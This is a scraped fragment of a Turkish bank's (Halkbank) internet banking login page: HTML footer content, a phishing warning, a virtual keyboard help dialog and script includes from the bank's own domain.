                                        <a href="https://www.halkbank.com.tr/5817-guvenlik" target="_blank">
                                            <div class="txt txt2">Güvenliğiniz için dikkat ediniz</div>
<div class="txt txt1">Bankamız adına açılan sahte sosyal medya hesapları ve mobil uygulamalarda yer alan linkleri tıklamayınız ve bu linkler aracılığı ile bilgilerinizi paylaşmayınız.</div>
<div class="txt txt3">Detaylı bilgi için tıklayınız</div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                </div>
            </div>
        </div>
    </div>

                    </div>
                </div>
            </div>
        </section>
        <section class="miniFooter">
            
            
<div class="container">
    <div id="logo-group">
            <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1" alt="Halk Bankası"></a></span>
    </div>
    <div class="link-group">
                <a href="/InternetBankingHost/HostLogin?lang=en-US" class="lang" style="display: inline;">

                    <i></i>
                    <span>English</span>
                </a>
                    <a target="_blank" href="https://www.halkbank.com.tr/5651-sikca_sorulan_sorular">Sıkça Sorulan Sorular</a>
                    <a href="https://www.halkbank.com.tr/5675-sube_atm_arama" target="_blank">
                 ATM ve Şubeler
             </a>
                    <a target="_blank" href="https://www.halkbank.com.tr/14891-planli_kesintiler">Duyurular</a>
    </div>
</div>
        </section>
        <section>
            



<div class="container login-box-area login-footer-area">
    <div class="row">
        <div class="col-md-3">
            <a href="/InternetBankingHost/PinCreate/CardVerification">
                <div class="box box2 text-align-center green-border">
                    <span>
                        <i class="fa fa-key box-image"></i>
                    </span>
                    <span class="title">Parola Oluşturma</span>
                    <span class="txt">Kart bilgilerinizi kullanarak İnternet Şubesi Parolanızı oluşturabilirsiniz.</span>
                </div>
            </a>
        </div>

        <div class="col-md-3">


                <a target="_blank" href="https://www.halkbank.com.tr/5659-mutlu_musteri_merkezi">
                    <div class="box box2 text-align-center orange-border">
                        <div class="happy-customer-center box-image"></div>
                        <span class="title">Mutlu Müşteri Merkezi</span>
                        <span class="txt">Halkbank olarak siz değerli müşterilerimizin taleplerini önemsiyoruz.</span>
                    </div>
                </a>
        </div>

        <div class="col-md-3">
                <a target="_blank" href="https://www.halkbank.com.tr/5817-guvenlik">
                    <div class="box box2 text-align-center yellow-border">
                        <div class="security-box-image box-image"></div>
                        <span class="title">Güvenlik Bilgileri</span>
                        <span class="txt">İnternet Şubesi güvenliğiniz için dikkat etmeniz gerekenler detaylandırılmıştır.</span>
                    </div>
                </a>

        </div>

        <div class="col-md-3">

                <a target="_blank" href="http://www.parafcard.com.tr/">
                    <div class="box box2 text-align-center paraf-border">
                        <div class="paraf-card box-image"></div>
                        <span class="title">Paraf Card</span>
                        <span class="txt">Kredi Kartı Dünyasında Ayrıcalıklar Bu Paraf’ta!</span>
                    </div>
                </a>
        </div>
    </div>
</div>

        </section>

    </section>
</div>

<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function () {
        $(document).on('keyboardApplied', function () {
            $("#PinLoginCustomerID").focus();
            document.getElementById("loginfooter1").removeAttribute("hidden");
        });
    });
    document.getElementById("main").removeAttribute("hidden");
</script>



    
    <vb-virtual-keyboard vb-selector=".password-keyboard, .keyboard-input" vb-maskchar="*" vb-culture="tr" vb-position-my="left top" vb-position-at="right bottom" vb-id="password-keyboard" vb-position-at-two="left bottom" vb-open-on="nothing" class="ng-isolate-scope"><vb-dialog-modal vb-id="VirtualKeyboardHelp" vb-working-type="informationDialog" vb-display-message="&quot;Güvenli Klavye&quot; uygulaması ile Halkbank İnternet Şubesi şifrenizi farenizi kullanarak ekrandan girebilirsiniz. Şifrenizi bu yöntem ile girmeniz, kullandığınız bilgisayarınıza uzaktan erişerek veya eğer halka açık noktada bir bilgisayar kullanıyorsanız, direk yüklenen bazı programlar ile, bilgisayarınızda girdiğiniz tüm şifre sahalarının kopyalanması ve kötü niyetli kişilerce kullanılması ihtimalini önleyecektir. Bu kopyalama yöntemi ile güvenli banka sistemine hiçbir şekilde ulaşılamamakta, sadece sizin bilgisayarınızda girdiğiniz her türlü bilgi sahası kopyalanabilmektedir." vb-title="Güvenli Klavye" vb-ok-button-text="Kapat" class="ng-isolate-scope"><div><vb-modal vb-id="DialogModalVirtualKeyboardHelp" vb-lazy-load="true" vb-show-button="false" vb-header-text="Güvenli Klavye" vb-disable-close-button="true" vb-drop-type="static" vb-on-dismiss="vm.onDismiss" vb-modal-class="result-modal" class="ng-isolate-scope"><span class="button-wrapper"><!-- ngIf: vm.showOnlyIconClass==undefined --><a ng-if="vm.showOnlyIconClass==undefined" id="DialogModalVirtualKeyboardHelpTrigerButton" tabindex="0" class="btn btn-primary  ng-hide" ng-show="vm.showButton" data-toggle="modal" data-target="#DialogModalVirtualKeyboardHelpContent"><!-- ngIf: vm.buttonIconSource --> </a><!-- end ngIf: vm.showOnlyIconClass==undefined --></span><!-- ngIf: vm.showOnlyIconClass!=undefined --><div class="modal fade result-modal" ng-class="vm.modalClass" id="DialogModalVirtualKeyboardHelpContent" tabindex="-1" role="dialog" data-keyboard="false" data-backdrop="static" aria-hidden="true" aria-labelledby="DialogModalVirtualKeyboardHelp-modal-title"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><!-- ngIf: vm.disableCloseButton != true --><h4 id="DialogModalVirtualKeyboardHelp-modal-title" class="modal-title ng-binding" ng-bind="vm.getHeaderText()">Güvenli Klavye</h4></div><div class="modal-body"><!-- ngIf: vm.isOpened || !vm.lazyLoad --></div></div></div></div></vb-modal></div></vb-dialog-modal></vb-virtual-keyboard>
    <div id="loginfooter1">
    
<footer id="footer" class="text-center login-footer">
    <div class="container">
        <div class="row">
            <div>
                <span class="copyright" aria-hidden="true">Her hakkı Türkiye Halk Bankası A.Ş.'ye aittir © 2019</span>
            </div>
        </div>
    </div>
</footer>
</div>


    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/jquery-all.js?v=1557307961656"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/angular-all.js?v=1557307961656"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/plugins-all.js?v=1557307961656"></script><div class="OverlayBG"></div><div class="OverlayBG"></div><div class="OverlayBG"></div><div class="OverlayBG"></div>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/highcharts-all.js?v=1557307961656"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/dataTables-all.js?v=1557307961656"></script>


        <script type="text/javascript">
            _.set(window, 'VeriBranch.Config.UniqueKey', '');
        </script>
        <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/vb-all.js?v=1557307961656"></script>
            <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/VeriBranch.Web/Modules/veribranch.directives.js?v=1557307961656"></script>

    
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/login-app-all.js?v=1557307961656"></script>

    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="user_prefs2" name="user_prefs2" autocomplete="off">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="hkb-user_prefs" name="hkbuser_prefs" autocomplete="off">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="clnthdr" name="clnthdr" value="{&quot;Connection&quot;:[&quot;keep-alive&quot;],&quot;Accept&quot;:[&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;],&quot;Accept-Encoding&quot;:[&quot;identity&quot;],&quot;Accept-Language&quot;:[&quot;tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&quot;],&quot;Cookie&quot;:[&quot;VB_IBHSession=5ccba3d861d4c2897650dc64a5cce04d8cc8ae8a0240121d0934368a9dedfeaad5b4d7ba&quot;],&quot;Host&quot;:[&quot;sube.halkbank.com.tr&quot;],&quot;Referer&quot;:[&quot;https://www.google.com/&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36&quot;],&quot;Upgrade-Insecure-Requests&quot;:[&quot;1&quot;],&quot;Purpose&quot;:[&quot;prefetch&quot;],&quot;X-ip&quot;:[&quot;37.130.96.162&quot;],&quot;X-Port&quot;:[&quot;57575&quot;]}" autocomplete="off">
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/js/sa-all.js?v=1557307961656"></script>

    <a href="javascript:void(0)" class="back-to-top visible-xs">Başa Dön</a>

</body></html>